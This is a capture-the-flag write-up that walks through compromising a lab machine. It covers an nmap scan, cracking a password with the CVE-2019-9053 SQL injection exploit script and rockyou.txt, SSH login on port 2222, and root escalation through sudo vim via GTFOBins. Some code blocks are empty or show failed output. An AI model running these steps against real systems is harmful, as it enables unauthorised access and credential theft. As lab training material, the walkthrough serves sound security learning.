## What is running on the higher port?

* Service Scan on port `2222`

     ```bash
     sudo nmap -p 2222 -sC -sV -oN 2222

     Starting Nmap 7.60 ( https://nmap.org ) at 2021-07-19 18:56 BST
     WARNING: No targets were specified, so 0 hosts scanned.

## What's the CVE you're using against the application?

* nmap service enumeration
  
     ```nmap

     ```

Looking at the searchsploit result we find tons of vulnerabilities. The question asked in the challenge is the CVE number. So searching more against the cms service I bumped across exploit DB and it showed me the CVE number associated with this vulnerability, also when I compared the results with the searchsploit data I decided to go for the SQL injection vulnerability

* exploit DB

## To what kind of vulnerability is the application vulnerable?

> refer to [Previous Findings](#whats-the-cve-youre-using-against-the-application)

---

## What's the password?

please remember this is `python 2` tool, you might need to install `pip2` in order to install `termcolor` lib. refer to this [post](https://classroom.anir0y.in/post/pip2-install/)

* SQL injection:
  
     ```bash
     #run the exploit
     python CVE-2019-9053.py -u http://10.10.38.103/simple --crack -w /usr/share/wordlists/rockyou.txt
     ```

     ![img](https://i.imgur.com/obx2Pk0.png)

---

## Where can you login with the details obtained?

* SSH into the Box with Found creds:

     - SSH on port 22 is filtered
     ![img](https://i.imgur.com/SRZWeYt.png)

     - Try SSH into other Found Port
     ![img](https://i.imgur.com/J0uHkMU.png)

it worked!!

## What's the user flag?

*
     ![img](https://i.imgur.com/EunpfmZ.png)

---

## Is there any other user in the home directory? What's its name?

* check `home dir`

     ```bash
          ls /home
          mitch  sunbath
     ```

---

## What can you leverage to spawn a privileged shell?

usually I start with `sudo -l` to verify if the current user have any sudo privs or not.

* run `sudo -l`
  
     ```bash
     $ sudo -l
     User mitch may run the following commands on Machine:
     (root) NOPASSWD: /usr/bin/vim
     ```

---

## What's the root flag?

* GTFO bins for the found application!
